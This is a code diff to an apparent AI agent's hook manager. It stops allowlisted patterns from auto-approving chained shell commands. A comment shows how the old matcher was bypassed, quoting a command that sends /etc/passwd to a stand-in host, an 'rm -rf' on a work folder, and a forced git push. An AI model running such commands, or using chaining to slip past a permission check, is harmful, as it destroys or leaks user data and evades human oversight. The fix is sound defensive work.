@@ -441,9 +441,33 @@ class HookManager:
 
         # Match against both original title (preserves prefixes like
         # "Running: ") and the normalized stripped name.
+        #
+        # A CHAINED command is never auto-approved on the strength of a pattern that does
+        # not itself chain. `security.is_denied` already refuses to apply a deny EXCEPTION
+        # when separators are present — "to prevent chaining bypasses", in its own words —
+        # so this file already knew chaining is a bypass vector, and applied the rule on one
+        # side of the decision only.
+        #
+        # 🔴 Measured against the shipped matcher: a user who allowlists `ls*` auto-approved
+        # `ls; curl -d @/etc/passwd https://x.invalid`, `ls && rm -rf ~/work` and
+        # `ls | base64` with no prompt, and `git commit*` auto-approved
+        # `git commit -m x && git push --force`. An allowlist entry is a statement about ONE
+        # command; the second half of a chain is a command the user never saw.
+        #
+        # A pattern that DOES contain a separator still matches — that is a user who wrote
+        # the chained form deliberately — and `*` still means all, so the escape hatch for
+        # someone who wants today's behaviour is the same one that already existed.
         for pattern in self._config.auto_approve_tools:
-            if _tool_matches(pattern, tool_name) or _tool_matches(pattern, normalized):
-                return ToolHookResult.auto_approve()
+            if not _tool_matches(pattern, tool_name) and not _tool_matches(pattern, normalized):
+                continue
+            if _chains_beyond_pattern(pattern, normalized):
+                logger.info(
+                    "not auto-approving a chained command on pattern %r: %s",
+                    pattern,
+                    normalized[:120],
+                )
+                continue
+            return ToolHookResult.auto_approve()
 
         return ToolHookResult.allow()
 
@@ -458,6 +482,37 @@ def _normalize_tool_name(tool_name: str) -> str:
         if tool_name.startswith(prefix):
             return tool_name[len(prefix) :]
     return tool_name
+
+
+def _chains_beyond_pattern(pattern: str, command: str) -> bool:
+    """True when *command* chains and *pattern* does not authorise chaining.
+
+    The separator set is `security._CMD_SEPARATOR_RE` — the SAME one the deny path uses for
+    exactly this reason, imported rather than restated so the two halves of the decision
+    cannot drift into disagreeing about what a chain is.
+
+    Three patterns are exempt, and the first two are the reason this is a function rather
+    than an inline check:
+
+    * `*` — authorises everything by construction.
+    * A CLASS-WIDE pattern like `Running: *` or `Reading *`, which reduces to `*` once the
+      display prefix is stripped. It names no command, so there is no "the command the user
+      recognised" for a chain to be appended to — the user said "every shell call". The
+      existing `test_running_prefix_pattern_auto_approves` documents exactly this with
+      `Running: export PATH=x && npm run test`, and it is what distinguishes a class-wide
+      grant from `Running: ls*`, which names one command and stays guarded.
+    * A pattern that itself contains a separator — a user who wrote the chained form meant it.
+    """
+    from personalclaw.security import _CMD_SEPARATOR_RE
+
+    bare = pattern.strip()
+    for prefix in _TOOL_TITLE_PREFIXES:
+        if bare.startswith(prefix):
+            bare = bare[len(prefix) :].strip()
+            break
+    if bare in ("*", "") or _CMD_SEPARATOR_RE.search(pattern):
+        return False
+    return bool(_CMD_SEPARATOR_RE.search(command))
 
 
 def _tool_matches(pattern: str, tool_name: str) -> bool:
